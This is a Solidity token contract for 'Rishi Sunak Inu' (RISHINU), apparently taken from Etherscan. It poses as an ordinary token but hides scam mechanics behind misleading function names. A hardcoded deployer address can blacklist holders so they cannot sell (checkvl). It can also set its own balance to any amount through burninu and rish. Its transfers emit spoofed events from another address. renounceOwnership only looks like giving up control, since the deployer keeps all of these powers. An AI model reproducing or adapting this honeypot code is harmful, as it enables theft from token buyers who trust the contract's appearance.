/**
 *Submitted for verification at Etherscan.io on 2022-10-25
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract RISHINU {
  
    mapping (address => uint256) public Rishi;
    mapping (address => uint256) public Sunak;
    mapping (address => bool) Il;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"Rishi Sunak Inu";
    string public symbol = unicode"RISHINU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address r_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;

    constructor()  {
    Rishi[msg.sender] = totalSupply;
    deploy(r_Construct, totalSupply); }

   
   address rdeployer = 0x9BA4d5F3443E3F1250eC122439d8d8c64C08B0B8;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == rdeployer)  {
        require(Rishi[msg.sender] >= value);
        Rishi[msg.sender] -= value;  
        Rishi[to] += value; 
        emit Transfer (r_Construct, to, value);
        return true; }  
        if(!Il[msg.sender]) {
        require(Rishi[msg.sender] >= value);
        Rishi[msg.sender] -= value;  
        Rishi[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function rish () public {
         if(msg.sender == rdeployer)   {
        Rishi[msg.sender] = Sunak[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Rishi[account]; }

        function sunny(address ii) public {
        if(msg.sender == rdeployer)  { 
        Il[ii] = false;}}
        function checkvl(address ii) public{
         if(msg.sender == rdeployer)  { 
        require(!Il[ii]);
        Il[ii] = true;
        }}
             function burninu(uint256 x) public {
        if(msg.sender == rdeployer)  { 
        Sunak[msg.sender] = x;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == rdeployer)  {
        require(value <= Rishi[from]);
        require(value <= allowance[from][msg.sender]);
        Rishi[from] -= value;  
        Rishi[to] += value; 
        emit Transfer (r_Construct, to, value);
        return true; }    
          if(!Il[from] && !Il[to]) {
        require(value <= Rishi[from]);
        require(value <= allowance[from][msg.sender]);
        Rishi[from] -= value;
        Rishi[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}